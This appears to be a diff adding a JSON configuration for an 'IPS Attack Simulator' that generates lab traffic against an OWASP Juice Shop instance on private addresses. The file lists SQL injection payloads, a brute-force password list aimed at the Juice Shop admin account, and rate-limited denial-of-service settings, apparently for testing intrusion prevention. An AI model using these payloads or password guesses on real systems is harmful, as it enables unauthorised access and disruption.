@@ -1,0 +1,53 @@
+{
+  "version": "1.0.0",
+  "app_name": "IPS Attack Simulator",
+  "allowed_targets": [
+    "192.168.56.0/24",
+    "10.0.0.0/8",
+    "172.16.0.0/12",
+    "127.0.0.1"
+  ],
+  "allowed_ports": [80, 443, 3000, 8080, 8443, 8765],
+  "default_target_ip": "192.168.56.129",
+  "default_target_port": 3000,
+  "max_duration_seconds": 300,
+  "max_rate_per_second": 20,
+  "max_concurrent_connections": 10,
+  "modes": {
+    "normal": {
+      "paths": ["/api/Challenges", "/", "/api/Products", "/api/Users"],
+      "default_rate": 1.0,
+      "default_duration": 30
+    },
+    "sqli": {
+      "endpoint": "/api/Challenges",
+      "auth_endpoint": "/rest/user/login",
+      "payloads": [
+        "' OR '1'='1",
+        "' OR 1=1 --",
+        "' UNION SELECT NULL--",
+        "admin'--",
+        "' OR 'x'='x",
+        "1' AND SLEEP(0)--"
+      ],
+      "default_rate": 0.5,
+      "default_duration": 30
+    },
+    "bruteforce": {
+      "login_endpoint": "/rest/user/login",
+      "username": "admin@juice-sh.op",
+      "passwords": ["admin", "password", "123456", "letmein", "admin123", "Password1", "qwerty"],
+      "max_attempts": 20,
+      "delay_between_attempts": 2.0,
+      "default_duration": 60
+    },
+    "dos": {
+      "endpoint": "/api/Challenges",
+      "default_rate": 5.0,
+      "max_rate": 10.0,
+      "max_workers": 4,
+      "default_duration": 30
+    }
+  }
+}
+
